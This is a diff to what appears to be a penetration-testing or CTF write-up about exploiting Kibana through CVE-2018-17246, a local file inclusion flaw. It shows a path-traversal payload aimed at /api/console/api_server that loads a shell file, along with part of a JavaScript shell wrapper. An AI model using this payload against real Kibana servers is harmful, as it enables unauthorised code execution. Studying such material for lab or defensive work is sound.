@@ -62,11 +62,10 @@ This allows us to use our web browser to view the `kibana` console
 
 Going to try this exploit `CVE-2018-17246 - Kibana LFI < 6.4.3 & 5.6.13`
 
-
+Payload:
 ```
-/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../../../tmp/nothing.js
+/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../../../<SHELL_LOCATION>
 ```
-
 
 ```javascript
 (function(){
@@ -82,3 +81,5 @@ Going to try this exploit `CVE-2018-17246 - Kibana LFI < 6.4.3 & 5.6.13`
     return /a/; // Prevents the Node.js application form crashing
 })();
 ```
+
+Look at `logstash`?
